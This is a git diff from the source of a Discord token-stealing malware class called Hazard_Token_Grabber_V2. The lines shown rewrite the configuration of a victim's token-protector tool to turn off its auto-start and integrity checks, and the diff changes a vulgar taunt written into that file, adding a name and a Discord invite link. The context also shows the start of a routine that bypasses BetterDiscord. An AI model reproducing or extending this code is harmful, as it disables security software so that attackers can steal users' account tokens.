@@ -257,7 +257,7 @@ class Hazard_Token_Grabber_V2(functions):
                     item = json.load(f)
                 except json.decoder.JSONDecodeError:
                     return
-                item['Gumbobrot just raped your token-protector shit LMAOOOO'] = "https://github.com/Gumbobrot"
+                item['Gumbobrot and Rdimo just raped your token-protector shit LMAOOOO https://discord.gg/HfwtKBEFAJ'] = "https://github.com/Gumbobrot"
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
                 item['integrity'] = False
@@ -275,7 +275,7 @@ class Hazard_Token_Grabber_V2(functions):
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, 'a') as f:
                 f.write(
-                    "\n\n//Gumbobrot just raped your token-protector shit LMAOOOO | https://github.com/Gumbobrot")
+                    "\n\n//Gumbobrot and Rdimo just raped your token-protector shit LMAOOOO https://discord.gg/HfwtKBEFAJ | https://github.com/Gumbobrot")
 
     async def bypassBetterDiscord(self):
         bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
